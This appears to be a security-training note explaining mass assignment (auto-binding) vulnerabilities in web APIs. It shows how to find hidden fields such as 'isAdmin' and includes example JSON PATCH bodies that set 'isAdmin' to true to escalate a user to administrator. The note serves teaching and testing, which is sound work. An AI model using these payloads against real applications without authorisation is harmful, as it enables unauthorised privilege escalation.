# 05. Mass assignment vulnerabilities

## 🧬 **Mass Assignment (Auto-binding)**

> 🛠️ Mass assignment (also known as auto-binding) can inadvertently create hidden parameters.
> 

It happens when software frameworks **automatically bind request parameters** to fields on an internal object.

⚠️ This may result in the application supporting parameters that were **never intended** to be processed by the developer.

---

## 🕵️ **Identifying Hidden Parameters**

Because mass assignment creates parameters from object fields, you can often discover them by **manually examining objects** returned by the API.

---

### 🔍 **Example:**

### PATCH Request:

```json
{
    "username": "wiener",
    "email": "wiener@example.com"
}

```

### Concurrent GET Request:

```json
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}

```

🎯 This may indicate that hidden parameters like `id` and `isAdmin` are **bound to the internal user object**, alongside the visible `username` and `email`.

---

## 🧪 **Testing Mass Assignment Vulnerabilities**

### 🔧 Try Updating Hidden Parameters

Send a PATCH request with the hidden parameter included:

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": false
}

```

---

### 🚫 Send an Invalid Value

Try an invalid value to observe different behavior:

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": "foo"
}

```

🔎 If the app behaves **differently**, it may suggest:

- The **invalid value impacts** query logic
- But the **valid value is silently ignored**
- This could indicate that the parameter is being **processed internally**

---

### ⚔️ Exploit the Vulnerability

Now try setting the `isAdmin` value to `true`:

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true
}

```

🚨 If this value is bound **without proper validation or sanitization**, the user `wiener` may gain **admin privileges**!

---

### 🔎 Verify the Exploit

Browse the application as `wiener` and check whether you now have access to **admin functionality**.

✅ If yes, you’ve confirmed a **mass assignment vulnerability**.